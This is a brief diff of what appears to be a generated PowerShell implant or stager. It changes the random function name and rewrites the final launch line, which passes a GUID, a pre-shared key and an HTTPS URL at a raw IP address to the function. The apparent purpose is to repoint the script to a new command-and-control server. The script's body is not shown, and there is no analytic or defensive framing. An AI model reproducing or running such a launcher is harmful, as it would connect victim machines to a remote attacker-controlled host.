@@ -1,4 +1,4 @@
-function Invoke-WBWNBX
+function Invoke-IXECOO
 {
     [CmdletBinding()]
     param (
@@ -790,4 +790,4 @@ else {
 
 }
 }
-Invoke-WBWNBX -Guid '2306aad2-8633-4df0-8f97-43bc7161e635' -Psk '73c63bbc57e0825b1b99608b9e8092d557aa8feeb1517864744155c2e349e0a9' -Url 'https://143.244.156.213:443'
+Invoke-IXECOO -Guid 'fdae10a7-d1df-4598-a11d-0e3f741b7041' -Psk '66cdd776f6ae267e60a2759d2bb2d72e7daa049f8ed89874e3df21aafc1ff7ee' -Url 'https://142.93.116.86:443'
